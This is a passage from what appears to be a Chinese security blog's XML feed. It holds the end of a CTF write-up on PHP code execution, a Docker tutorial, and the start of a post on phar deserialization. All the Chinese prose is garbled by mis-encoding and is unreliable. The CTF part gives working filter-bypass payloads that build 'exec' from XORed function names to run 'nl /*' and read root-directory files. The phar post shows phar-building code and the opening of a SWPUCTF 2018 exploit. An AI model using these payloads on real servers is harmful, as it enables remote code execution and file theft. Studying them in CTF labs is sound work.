å…¥çš„æ˜¯å­—ç¬¦ä¸²ï¼Œåå¼•å·ä¸èƒ½è¢«è¯†åˆ«ä¸ºç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œå› æ­¤ä½¿ç”¨åç§°è¾ƒçŸ­çš„execå‡½æ•°</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure></div><p>ä½†æ˜¯è¿™æ ·å°±ä¸èƒ½å¤–éƒ¨ä¼ å…¥å‘½ä»¤æ¥èŠ‚çœpayloadï¼Œå› æ­¤è¦æ±‚æ‰§è¡Œçš„å‘½ä»¤è¶³å¤ŸçŸ­ï¼Œè¿™é‡Œä½¿ç”¨nlå‘½ä»¤</p><p>linuxä¸‹æ‰§è¡Œ<code>nl /*</code>æ‰«ææ ¹ç›®å½•ï¼Œä¼šæ‰“å°æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œä¸ä¼šç›®å½•å‘ä¸‹é€’å½’</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072228668.jpg"                      alt="6"                ><figcaption>6</figcaption></figure></p><blockquote><p><code>nl [å‚æ•°] [æ–‡ä»¶]</code></p><p>nlå‘½ä»¤æ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„ç¼–å·è¿‡æ»¤å·¥å…·ã€‚è¯¥å‘½ä»¤å¯ä»¥è¯»å– File å‚æ•°ï¼ˆç¼ºçœæƒ…å†µä¸‹æ ‡å‡†è¾“å…¥ï¼‰ï¼Œè®¡ç®—è¾“å…¥ä¸­çš„è¡Œå·ï¼Œå°†è®¡ç®—è¿‡çš„è¡Œå·å†™å…¥æ ‡å‡†è¾“å‡ºã€‚</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aff   rad2deg sin <span class="comment">//`nl</span></span><br><span class="line"><span class="number">16</span>   exp tan   <span class="comment">// /</span></span><br><span class="line"><span class="number">9</span>f   cos pi  <span class="comment">//*`</span></span><br><span class="line">  </span><br><span class="line">(<span class="title function_ invoke__">dechex</span>(<span class="number">2815</span>)^rad2deg^sin).((<span class="number">1</span>).(<span class="number">6</span>)^exp^tan).(<span class="title function_ invoke__">dechex</span>(<span class="number">159</span>)^cos^pi) <span class="comment">//`nl /*`</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ca   abs log <span class="comment">//nl</span></span><br><span class="line"><span class="number">164</span>   exp tan <span class="comment">// /*</span></span><br><span class="line">(<span class="title function_ invoke__">dechex</span>(<span class="number">202</span>)^abs^log).(<span class="title function_ invoke__">hexdec</span>(a4)^exp^tan) <span class="comment">//nl /*</span></span><br></pre></td></tr></table></figure></div><p>ç”¨ä¸Šé¢çš„ç©·ä¸¾è„šæœ¬æ‰¾å‡ºæœ€é€‚åˆçš„è¿›åˆ¶è½¬æ¢exec</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;34 23 22950&quot;</span>&#125;</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>) <span class="comment">//exec</span></span><br></pre></td></tr></table></figure></div><p>æ— èŠ±æ‹¬å·payload</p><p>é•¿åº¦:70</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)((<span class="title function_ invoke__">dechex</span>(<span class="number">202</span>)^abs^log).((<span class="number">1</span>).(<span class="number">6</span>).(<span class="number">4</span>)^exp^tan))</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072227751.jpg"                      alt="7"                ><figcaption>7</figcaption></figure></p><p>æœ¬åœ°php7.4ä»¥ä¸Šä¹Ÿèƒ½æˆåŠŸæ‰§è¡Œ(ä½†æ˜¯php8ä»¥åæœ‰ä¸ªfatal error ä¸èƒ½ä½¿ç”¨æœªå®šä¹‰å¸¸é‡ï¼Œç›´æ¥ç”¨å‡½æ•°åå¼‚æˆ–çš„æ—¶å€™ä¼šè¯†åˆ«æˆå¸¸é‡)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072229986.jpg"                      alt="9"                ><figcaption>9</figcaption></figure></p><p>ä¸è¿‡è¿™è¾¹å°è¯•äº†ä¸‹å¸¦èŠ±æ‹¬å·çš„ï¼Œä¼¼ä¹ä¹Ÿèƒ½æˆåŠŸï¼ŒèŠ±æ‹¬å·åªåœ¨php8ä»¥åæ‰è¢«å®šä¹‰ä¸º<strong>Fatal error</strong></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072227919.jpg"                      alt="11"                ><figcaption>11</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072227457.jpg"                      alt="12"                ><figcaption>12</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerå­¦ä¹ </title>
      <link href="/2022/01/12/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/12/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="dockerå­¦ä¹ "><a href="#dockerå­¦ä¹ " class="headerlink" title="dockerå­¦ä¹ "></a>dockerå­¦ä¹ </h1><h2 id="dockerfileå¯åŠ¨ç¯å¢ƒ"><a href="#dockerfileå¯åŠ¨ç¯å¢ƒ" class="headerlink" title="dockerfileå¯åŠ¨ç¯å¢ƒ"></a>dockerfileå¯åŠ¨ç¯å¢ƒ</h2><p>äº‹å…ˆç¼–å†™å¥½dockerfileï¼Œåœ¨å…¶æ‰€åœ¨ç›®å½•ä¸‹æ‰“å¼€ç»ˆç«¯ï¼Œä»dockerfileå»ºç«‹é•œåƒ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t nginx:v1 . </span><br></pre></td></tr></table></figure></div><blockquote><p>-t snginx:v1 ç»™æ–°æ„å»ºçš„é•œåƒå–åä¸ºnginxï¼Œå¹¶è®¾å®šç‰ˆæœ¬ä¸º v1 ã€‚</p><p>âš ï¸ä¸è¦å¿˜è®°ç‰ˆæœ¬å·åç©ºæ ¼åŠ ä¸€ä¸ª<code>.</code> æœ€åçš„<code>.</code>ä»£è¡¨æœ¬æ¬¡æ‰§è¡Œçš„ä¸Šä¸‹æ–‡è·¯å¾„</p><p>ä¸Šä¸‹æ–‡è·¯å¾„:æ˜¯æŒ‡ docker åœ¨æ„å»ºé•œåƒï¼Œæœ‰æ—¶å€™æƒ³è¦ä½¿ç”¨åˆ°æœ¬æœºçš„æ–‡ä»¶ï¼ˆæ¯”å¦‚å¤åˆ¶ï¼‰ï¼Œdocker build å‘½ä»¤å¾—çŸ¥è¿™ä¸ªè·¯å¾„åï¼Œä¼šå°†è·¯å¾„ä¸‹çš„æ‰€æœ‰å†…å®¹æ‰“åŒ…ã€‚é»˜è®¤ä¸Šä¸‹æ–‡è·¯å¾„å°±æ˜¯ Dockerfile æ‰€åœ¨çš„ä½ç½®a</p><p>âš ï¸ä¸Šä¸‹æ–‡è·¯å¾„ä¸‹ä¸è¦æ”¾æ— ç”¨çš„æ–‡ä»¶ï¼Œå› ä¸ºä¼šä¸€èµ·æ‰“åŒ…å‘é€ç»™ docker å¼•æ“ï¼Œå¦‚æœæ–‡ä»¶è¿‡å¤šä¼šé€ æˆè¿‡ç¨‹ç¼“æ…¢ã€‚</p></blockquote><p>ä½¿ç”¨<code>docker images</code>å‘½ä»¤æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸï¼Œè‹¥æˆåŠŸä¼šå‘ç°æœ‰ä¸€ä¸ªåˆšåˆ›å»ºçš„nginxé•œåƒ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY    TAG   IMAGE ID       CREATED        SIZE</span><br><span class="line">nginx         v1   3efd9464e2a0   2 hours ago    134MB</span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨è¯¥é•œåƒå¯åŠ¨å®¹å™¨ï¼Œæ³¨æ„ç«¯å£æ˜ å°„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p æœ¬åœ°ç«¯å£ï¼šå®¹å™¨ç«¯å£ é•œåƒåç§°</span><br><span class="line">docker run  --name docker_nginx_v1   -d -p 127.0.0.1:5001:80 nginx:v1</span><br></pre></td></tr></table></figure></div><blockquote><p>æ„æ€æ˜¯å¯åŠ¨ä¸€ä¸ªåå­—ä¸ºdocker_nginx_v1çš„å®¹å™¨ï¼Œä½¿ç”¨nginx:v1é•œåƒï¼Œå¹¶å°†æœ¬æœº127.0.0.1:5001æ˜ å°„åˆ°è¯¥å®¹å™¨çš„80ç«¯å£(å› ä¸ºnginxçš„é»˜è®¤ç«¯å£æ˜¯<strong>80</strong>)ï¼Œå› æ­¤å»ºç«‹æˆåŠŸåå¯ä»¥ä»127.0.0.1:5001è®¿é—®è¯¥ç¯å¢ƒ</p><p>æ³¨ï¼š</p><p>1.å®¹å™¨é»˜è®¤éƒ½æ˜¯ç»‘å®š tcp ç«¯å£ï¼Œå¦‚æœè¦ç»‘å®š UDP ç«¯å£ï¼Œå¯ä»¥åœ¨å®¹å™¨çš„ç«¯å£åé¢åŠ ä¸Š &#x2F;udp</p><p>2.-d:åœ¨åå°è¿è¡Œ</p><p>3.-it:äº¤äº’å¼æ–¹å¼è¿è¡Œ</p><p>4.-p:æŒ‡å®šç«¯å£</p></blockquote><p><code>docker ps</code>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID   IMAGE      COMMAND                  CREATED         STATUS         PORTS                    NAMES</span><br><span class="line">dd0c50ae3ef8   nginx:v1   &quot;/docker-entrypoint.â€¦&quot;   4 seconds ago   Up 3 seconds   127.0.0.1:5001-&gt;80/tcp   docker_nginx_v1</span><br></pre></td></tr></table></figure></div><p>è®¿é—®127.0.0.1:5001</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1t4bxp031j20zk06u0t8.jpg"                      alt="image-20220501191611894"                ><figcaption>image-20220501191611894</figcaption></figure></p><p>dockerfileçš„å†…å®¹</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27;</span> &gt; /usr/share/nginx/html/index.html</span></span><br></pre></td></tr></table></figure></div><h2 id="ä½¿ç”¨dockerfileæ„å»ºé•œåƒ"><a href="#ä½¿ç”¨dockerfileæ„å»ºé•œåƒ" class="headerlink" title="ä½¿ç”¨dockerfileæ„å»ºé•œåƒ"></a>ä½¿ç”¨dockerfileæ„å»ºé•œåƒ</h2><p>Dockerfileæ•´ä½“å°±ä¸¤ç±»è¯­å¥ç»„æˆï¼š</p><ul><li># Comment æ³¨é‡Šä¿¡æ¯</li><li>Instruction arguments æŒ‡ä»¤ å‚æ•°ï¼Œä¸€è¡Œä¸€ä¸ªæŒ‡ä»¤ã€‚</li></ul><p>âš ï¸</p><ol><li>Dockerfileæ–‡ä»¶å<strong>é¦–å­—æ¯å¿…é¡»å¤§å†™</strong>ã€‚</li><li>DockerfileæŒ‡ä»¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯ä¸ºæ–¹ä¾¿å’Œå‚æ•°åšåŒºåˆ†ï¼Œé€šå¸¸<strong>æŒ‡ä»¤ä½¿ç”¨å¤§å†™å­—æ¯ã€‚</strong></li><li>Dockerfileä¸­æŒ‡ä»¤æŒ‰é¡ºåºä»ä¸Šè‡³ä¸‹ä¾æ¬¡æ‰§è¡Œã€‚</li><li>Dockerfileä¸­ç¬¬ä¸€ä¸ªéæ³¨é‡Šè¡Œå¿…é¡»æ˜¯<strong>FROMæŒ‡ä»¤</strong>ï¼Œç”¨æ¥æŒ‡å®šåˆ¶ä½œå½“å‰é•œåƒä¾æ®çš„æ˜¯å“ªä¸ªåŸºç¡€é•œåƒã€‚</li><li>Dockerfileä¸­éœ€è¦è°ƒç”¨çš„æ–‡ä»¶å¿…é¡»è·ŸDockerfileæ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œæˆ–è€…åœ¨å…¶å­ç›®å½•ä¸‹ï¼Œçˆ¶ç›®å½•æˆ–è€…å…¶å®ƒè·¯å¾„æ— æ•ˆã€‚</li></ol><h3 id="FROMå’ŒRUN"><a href="#FROMå’ŒRUN" class="headerlink" title="FROMå’ŒRUN"></a>FROMå’ŒRUN</h3><p><strong>FROM</strong>ï¼šå®šåˆ¶çš„é•œåƒéƒ½æ˜¯åŸºäº FROM çš„é•œåƒï¼Œè¿™é‡Œçš„ nginx å°±æ˜¯å®šåˆ¶éœ€è¦çš„åŸºç¡€é•œåƒã€‚åç»­çš„æ“ä½œéƒ½æ˜¯åŸºäº nginxã€‚</p><p><strong>RUN</strong>ï¼šç”¨äºæ‰§è¡Œåé¢è·Ÿç€çš„å‘½ä»¤è¡Œå‘½ä»¤ã€‚æœ‰ä»¥ä¸‹ä¿©ç§æ ¼å¼ï¼š</p><p>shellæ ¼å¼</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> &lt;å‘½ä»¤è¡Œå‘½ä»¤&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>&lt;å‘½ä»¤è¡Œå‘½ä»¤&gt; ç­‰åŒäºï¼Œåœ¨ç»ˆç«¯æ“ä½œçš„ shell å‘½ä»¤ã€‚</p></blockquote><p>execæ ¼å¼</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [<span class="string">&quot;å¯æ‰§è¡Œæ–‡ä»¶&quot;</span>, <span class="string">&quot;å‚æ•°1&quot;</span>, <span class="string">&quot;å‚æ•°2&quot;</span>]</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [<span class="string">&quot;./test.php&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;offline&quot;</span>] </span></span><br><span class="line"><span class="comment"># ç­‰ä»·äº RUN ./test.php dev offline</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¦‚æœæœ‰å¤šæ¡å‘½ä»¤æ‰§è¡Œï¼Œä¸è¦åˆ†æˆå¤šä¸ªRUNè¯­å¥ï¼Œdockerfileçš„æŒ‡ä»¤æ¯æ‰§è¡Œä¸€æ¬¡éƒ½ä¼šåœ¨ docker ä¸Šæ–°å»ºä¸€å±‚ï¼Œè¿‡å¤šæ— æ„ä¹‰çš„å±‚ï¼Œä¼šé€ æˆé•œåƒè†¨èƒ€è¿‡å¤§</p><p>æ­£ç¡®å†™æ³•æ˜¯ç”¨<code>\</code>è¡¨ç¤ºåˆ†è¡Œï¼Œ<code>&amp;&amp;</code>é“¾æ¥å‘½ä»¤</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum -y install wget \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; tar -xvf redis.tar.gz</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>å¤åˆ¶æŒ‡ä»¤ï¼Œå¯ä»¥ä»ä¸Šä¸‹æ–‡ç›®å½•ä¸­å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•åˆ°å®¹å™¨å†…æŒ‡å®šè·¯å¾„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;æºè·¯å¾„1&gt;...  &lt;ç›®æ ‡è·¯å¾„&gt;</span><br><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;æºè·¯å¾„1&gt;&quot;,...  &quot;&lt;ç›®æ ‡è·¯å¾„&gt;&quot;]</span><br></pre></td></tr></table></figure></div><ul><li><p>**[â€“chown&#x3D;<user>:<group>]**ï¼šå¯é€‰å‚æ•°ï¼Œç”¨æˆ·æ”¹å˜å¤åˆ¶åˆ°å®¹å™¨å†…æ–‡ä»¶çš„æ‹¥æœ‰è€…å’Œå±ç»„</p></li><li><p>**&lt;æºè·¯å¾„&gt;**ï¼šæºæ–‡ä»¶æˆ–è€…æºç›®å½•ï¼Œè¿™é‡Œå¯ä»¥æ˜¯é€šé…ç¬¦è¡¨è¾¾å¼ï¼Œå…¶é€šé…ç¬¦è§„åˆ™è¦æ»¡è¶³ Go çš„ filepath.Match è§„åˆ™</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pattern:</span><br><span class="line">&#123; term &#125;</span><br><span class="line">term:</span><br><span class="line">&#x27;*&#x27;                                  åŒ¹é…0æˆ–å¤šä¸ªéè·¯å¾„åˆ†éš”ç¬¦çš„å­—ç¬¦</span><br><span class="line">&#x27;?&#x27;                                  åŒ¹é…1ä¸ªéè·¯å¾„åˆ†éš”ç¬¦çš„å­—ç¬¦</span><br><span class="line">&#x27;[&#x27; [ &#x27;^&#x27; ] &#123; character-range &#125; &#x27;]&#x27;  å­—ç¬¦ç»„ï¼ˆå¿…é¡»éç©ºï¼‰</span><br><span class="line">c                                    åŒ¹é…å­—ç¬¦cï¼ˆc != &#x27;*&#x27;, &#x27;?&#x27;, &#x27;\\&#x27;, &#x27;[&#x27;ï¼‰</span><br><span class="line">&#x27;\\&#x27; c                               åŒ¹é…å­—ç¬¦c</span><br><span class="line">character-range:</span><br><span class="line">c           åŒ¹é…å­—ç¬¦cï¼ˆc != &#x27;\\&#x27;, &#x27;-&#x27;, &#x27;]&#x27;ï¼‰</span><br><span class="line">&#x27;\\&#x27; c      åŒ¹é…å­—ç¬¦c</span><br><span class="line">lo &#x27;-&#x27; hi   åŒ¹é…åŒºé—´[lo, hi]å†…çš„å­—ç¬¦</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li><li><p>**&lt;ç›®æ ‡è·¯å¾„&gt;**ï¼šå®¹å™¨å†…çš„æŒ‡å®šè·¯å¾„ï¼Œè¯¥è·¯å¾„ä¸ç”¨äº‹å…ˆå»ºå¥½ï¼Œ<u>è·¯å¾„ä¸å­˜åœ¨çš„è¯ï¼Œä¼šè‡ªåŠ¨åˆ›å»º</u>ã€‚</p></li></ul><h2 id="é•œåƒæºæ‹‰å–è¶…æ—¶é—®é¢˜"><a href="#é•œåƒæºæ‹‰å–è¶…æ—¶é—®é¢˜" class="headerlink" title="é•œåƒæºæ‹‰å–è¶…æ—¶é—®é¢˜"></a>é•œåƒæºæ‹‰å–è¶…æ—¶é—®é¢˜</h2><p>å°†dockerfileä¸­çš„</p><p><a class="link"   href="http://link.zhihu.com/?target=http://k8s.gcr.io" >k8s.gcr.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> â€”&gt; lank8s.cn<br><a class="link"   href="http://link.zhihu.com/?target=http://gcr.io" >gcr.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> â€“&gt; gcr.lank8s.cn</p>]]></content>
      
      
      <categories>
          
          <category> utils </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pharååºåˆ—åŒ–</title>
      <link href="/2022/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h1><h3 id="pharæ–‡ä»¶ç»“æ„"><a href="#pharæ–‡ä»¶ç»“æ„" class="headerlink" title="pharæ–‡ä»¶ç»“æ„"></a>pharæ–‡ä»¶ç»“æ„</h3><p>1.a stub<br>    å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx<?php xxx; __HALT_COMPILER();?>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶<br>2.a manifest describing the contents<br>    pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹<br>3.the file contentsâ€”è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹<br>4.[optional] a signature for verifying Phar integrity (phar file format only)â€”ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾</p><h3 id="ç”Ÿæˆpharæ–‡ä»¶"><a href="#ç”Ÿæˆpharæ–‡ä»¶" class="headerlink" title="ç”Ÿæˆpharæ–‡ä»¶"></a>ç”Ÿæˆpharæ–‡ä»¶</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ä¼šåœ¨åŒç›®å½•ç”Ÿæˆ phar.phar æ–‡ä»¶</p><p>æ³¨æ„ï¼šè¦æƒ³ç”Ÿæˆpharæ–‡ä»¶ï¼Œå¿…é¡»å°†phar.readonlyé…ç½®é¡¹é…ç½®ä¸º0æˆ–Off,å¹¶ä¸”åˆ é™¤è¡Œé¦–åˆ†å·ï¼Œåœ¨è¡Œå°¾åŠ . å¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶</p></blockquote><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„</p><p>phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œ<a class="link"   href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020" >ååºåˆ—åŒ– <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221511.jpg"                      alt="image-20211018194419673"                ><figcaption>image-20211018194419673</figcaption></figure></p><h3 id="SWPUCTF-2018-SimplePHP-EXP"><a href="#SWPUCTF-2018-SimplePHP-EXP" class="headerlink" title="[SWPUCTF 2018]SimplePHP EXP"></a>[SWPUCTF 2018]SimplePHP EXP</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span 